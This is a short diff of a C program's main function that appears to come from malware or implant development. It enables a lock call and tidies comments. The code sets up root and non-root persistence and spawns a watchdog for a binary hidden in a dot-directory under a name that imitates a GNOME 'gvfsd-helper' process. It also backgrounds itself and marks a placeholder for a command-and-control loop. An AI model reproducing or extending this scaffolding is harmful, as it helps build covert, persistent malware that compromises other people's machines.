@@ -9,7 +9,6 @@
 #include "utils.h"
 #include "persistence.h"
 
-
 int main(int argc, char *argv[]) {
 
     pid_t id = getuid();
@@ -17,7 +16,7 @@ int main(int argc, char *argv[]) {
 
     // TODO: session_dbus_file_write
 
-    //create_lock();
+    create_lock();
 
     // Creating shared mem w/ unique key
     // File /proc/sysvipc/shm contains the memory key artifacts.
@@ -44,7 +43,6 @@ int main(int argc, char *argv[]) {
         spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
 
     } else { // non-root user....
-        // TODO encapsulate this in a separate function?
 
         bool desktop_res = nonroot_desktop_persistence();
         if (desktop_res == false ) {
@@ -67,7 +65,6 @@ int main(int argc, char *argv[]) {
        //daemon(0, 0);
        sleep(30); // keep process running in background as "daemon".
    }
-
 
     // TODO: main_c2_loop goes here.
 
